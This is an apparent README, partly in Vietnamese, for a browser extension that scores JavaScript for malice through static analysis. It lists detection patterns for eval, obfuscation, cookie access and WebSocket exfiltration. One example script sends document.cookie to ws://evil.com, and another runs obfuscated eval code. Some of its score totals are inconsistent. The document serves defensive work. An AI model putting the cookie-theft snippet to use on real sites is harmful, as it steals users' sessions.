# Feature Extraction & Scoring

Extension sử dụng **static analysis** để extract features từ JavaScript files và tính risk score.

## Features được extract

### 1. Dangerous Functions (45 điểm)
Đếm số lần gọi các hàm nguy hiểm:
- `eval()` - Execute arbitrary code (15 điểm/lần, max 45)
- `Function()` constructor - Dynamic code generation (15 điểm/lần, max 45)
- `setTimeout(string)` / `setInterval(string)` - Execute string as code (10 điểm/lần, max 30)
- `document.write()` - DOM manipulation (5 điểm/lần, max 15)
- `atob()` / `btoa()` - Base64 encoding/decoding (5 điểm/lần, max 20)
- `unescape()` / `decodeURIComponent()` - String decoding (3 điểm/lần, max 15)
- `innerHTML` / `outerHTML` - DOM injection (3 điểm/lần, max 15)

### 2. Obfuscation Detection (25 điểm)
Phát hiện code bị obfuscate:
- Hex strings (`\x41\x42...`)
- Unicode escapes (`\u0041\u0042...`)
- Base64 strings (dài > 20 ký tự)
- Long identifiers (> 30 ký tự)
- String concatenation (`"ev" + "al"`)
- `String.fromCharCode()` / `charCodeAt()`

### 3. URL Analysis (15 điểm)
Phân tích URLs trong code:
- Tổng số URLs
- Số lượng external URLs (khác domain)
- Phần trăm external URLs
- Unique domains

**Scoring:**
- External URLs > 80%: +15 điểm
- External URLs > 50%: +10 điểm
- Total URLs > 50: +10 điểm

### 4. String Entropy (20 điểm)
Tính Shannon entropy của strings:
- Average entropy > 4.5: +15 điểm
- Max entropy > 5.0: +10 điểm
- High entropy strings (> 4.5): +10 điểm

**Entropy cao = Likely obfuscated**

### 5. Suspicious Patterns (25 điểm)
Phát hiện patterns đáng ngờ:
- Dynamic property access: `window["eval"]`, `this["Function"]` (+15 điểm)
- `importScripts()` - Load external code (+10 điểm/lần)
- `WebSocket` - Data exfiltration (+10 điểm)
- `XMLHttpRequest` / `fetch` - Network requests (+5-10 điểm)
- `document.cookie` access - Cookie theft (+5-10 điểm)
- `localStorage` access

### 6. Code Complexity (10 điểm)
Đo độ phức tạp code:
- Cyclomatic complexity > 100: +10 điểm
- Max nesting depth > 10: +5 điểm
- Số lượng loops, conditionals, functions

### 7. Suspicious Domains (30 điểm)
Check domains trong URLs:
- URL shorteners (bit.ly, tinyurl.com): +15 điểm
- Free TLDs (.tk, .ml, .ga): +15 điểm
- IP addresses: +10 điểm
- Very long domains (> 40 chars): +5 điểm
- Pastebin, hastebin: +15 điểm

## Risk Scoring

**Total Score: 0-100**

### Risk Levels:
- **0-39: Low Risk** → Allow (màu xanh)
- **40-69: Medium Risk** → Suspect (màu vàng) - Hỏi user
- **70-100: High Risk** → Block (màu đỏ) - Chặn với warning

### Actions:
1. **Allow**: Redirect về trang gốc ngay
2. **Suspect**: Hiển thị warning với details, cho user quyết định
3. **Block**: Hiển thị warning nghiêm trọng, khuyến nghị chặn

## Static Analysis Process

```
JS Code
  ↓
Parse AST (acorn)
  ↓
Walk AST nodes
  ↓
Extract features:
  - Count function calls
  - Analyze strings
  - Detect patterns
  - Calculate complexity
  ↓
Calculate risk score
  ↓
Determine action
```

**Timeout: 10 seconds**

## ML Training Data Export

Extension lưu features của 100 scripts gần nhất để export cho ML training.

### Export format:
```json
{
  "url": "https://example.com/script.js",
  "timestamp": 1234567890,
  "label": null,
  "features": {
    "eval_count": 0,
    "function_constructor_count": 0,
    "avg_entropy": 3.45,
    "obfuscation_score": 25,
    ...
  },
  "risk_score": 45,
  "risk_level": "medium"
}
```

### Sử dụng:
1. Duyệt web bình thường
2. Extension tự động extract features
3. Vào Options → Export ML Training Data
4. Dùng file JSON để train model (scikit-learn, TensorFlow, etc.)

## Ví dụ

### Clean Script (Score: 15)
```javascript
function hello() {
  console.log("Hello World");
  fetch('/api/data').then(r => r.json());
}
```
- Không có dangerous functions
- Entropy thấp
- 1 fetch call: +5 điểm
- Total: 15 điểm → **Allow**

### Suspicious Script (Score: 55)
```javascript
var _0x1234 = ["\x65\x76\x61\x6c"];
eval(atob("ZnVuY3Rpb24oKXt9"));
setTimeout("malicious()", 1000);
```
- eval(): +15 điểm
- atob(): +5 điểm
- setTimeout(string): +10 điểm
- Hex strings: +10 điểm
- High entropy: +15 điểm
- Total: 55 điểm → **Suspect**

### Malicious Script (Score: 85)
```javascript
eval(Function(atob("dmFyIGE9ZG9jdW1lbnQuY29va2ll"))());
for(var i=0;i<100;i++){
  new WebSocket("ws://evil.com").send(document.cookie);
}
```
- eval(): +15 điểm
- Function(): +15 điểm
- atob(): +5 điểm
- WebSocket: +10 điểm
- document.cookie: +10 điểm
- Obfuscation: +20 điểm
- Suspicious domain: +15 điểm
- Total: 90 điểm → **Block**

## Limitations

1. **Static analysis only** - Không thực thi code
2. **False positives** - Legitimate code có thể bị đánh dấu suspect
3. **Obfuscation bypass** - Malware có thể evade detection
4. **Performance** - Large files mất vài giây để analyze

## Future Improvements

- [ ] Machine Learning model integration
- [ ] Behavioral analysis (runtime monitoring)
- [ ] Community-based threat intelligence
- [ ] Automatic whitelist learning
- [ ] Performance optimization (Web Worker)
